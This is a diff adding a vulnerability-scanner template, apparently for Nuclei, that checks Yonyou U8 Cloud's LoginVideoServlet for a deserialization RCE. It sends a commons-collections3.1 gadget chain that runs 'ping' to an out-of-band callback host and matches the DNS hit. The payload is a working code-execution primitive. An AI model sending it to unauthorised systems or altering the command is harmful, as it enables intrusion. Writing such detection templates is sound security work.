@@ -1,0 +1,25 @@
+id: Yonyou-U8-Cloud-loginvideoservlet-rce
+
+info:
+  name: 用友U8 Cloud /servlet/LoginVideoServlet 反序列化
+  author: HuanXiong
+  severity: critical
+  description: |-
+    
+  reference:
+    - 
+  tags: RCE
+
+http:
+  - raw:
+    - |
+      POST /servlet/LoginVideoServlet HTTP/1.1
+      Host: {{Hostname}}
+
+      {{generate_java_gadget("commons-collections3.1", "ping {{interactsh-url}}", "raw")}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
